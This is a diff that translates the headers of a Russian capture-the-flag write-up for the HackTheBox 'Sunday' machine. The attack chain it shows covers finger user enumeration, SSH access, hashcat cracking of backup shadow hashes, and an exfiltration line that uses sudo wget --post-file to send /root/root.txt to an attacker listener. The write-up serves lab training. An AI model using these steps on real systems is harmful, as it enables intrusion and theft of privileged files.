@@ -10,30 +10,30 @@
 ## Цепочка Атаки
 
 ```text
-Reconnaissance
+Разведка
 ├── nmap -sC -sV -p- sunday.htb → 79 (Finger), 22022 (SSH OpenSSH 8.4)
 └── Платформа Solaris
 
-Enumeration (Finger)
+Перечисление (Finger)
 ├── msfconsole → scanner/finger/finger_users
 └── ./finger-user-enum.pl -u root -t <target>
     └── Ответ: root ... <PASSWORD> (Office Location = пароль-подсказка)
 
-Foothold (SSH)
+Первичный Доступ (SSH)
 ├── ssh -p 22022 sunny@sunday.htb → password: <PASSWORD>
 └── sudo -l → (root) NOPASSWD: /root/troll - ЛОВУШКА
 
-Lateral Movement (Backup)
+Боковое Перемещение (Backup)
 ├── cd /backup → agent22.backup, shadow.backup
 ├── sammy:<SHA256_HASH>
 ├── sunny:<SHA256_HASH>
 └── hashcat -m 7400 → sammy:<PASSWORD>
 
-User Flag
+Флаг Пользователя
 ├── ssh -p 22022 sammy@sunday.htb (<PASSWORD>)
 └── cat user.txt → <USER_FLAG>
 
-Privilege Escalation (sudo wget)
+Повышение Привилегий (sudo wget)
 ├── sudo -l → (root) NOPASSWD: /usr/bin/wget
 ├── Exfil: sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
 ├── nc -lvnp 8000 → root flag (<ROOT_FLAG>)
